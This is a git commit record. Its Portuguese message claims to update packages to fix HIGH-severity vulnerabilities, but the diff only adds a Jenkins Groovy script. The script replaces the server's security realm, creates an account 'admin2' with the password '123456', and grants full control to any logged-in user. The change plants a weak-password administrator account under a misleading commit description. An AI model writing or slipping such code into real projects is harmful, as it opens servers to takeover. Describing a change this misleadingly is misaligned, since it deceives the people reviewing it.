c81ad13d1240b3bd62ff0138e0d098a9a337f577
Anderson Andrade <anderson.andrade@bee2pay.com>
2026-04-16 16:35:51 -0300

    fix: atualiza pacotes para corrigir vulnerabilidades HIGH

---
+++ create-user.groovy
@@ -0,0 +1,13 @@
+import jenkins.model.*
+import hudson.security.*
+
+def instance = Jenkins.getInstance()
+
+def hudsonRealm = new HudsonPrivateSecurityRealm(false)
+hudsonRealm.createAccount("admin2", "123456")
+instance.setSecurityRealm(hudsonRealm)
+
+def strategy = new FullControlOnceLoggedInAuthorizationStrategy()
+instance.setAuthorizationStrategy(strategy)
+
+instance.save()
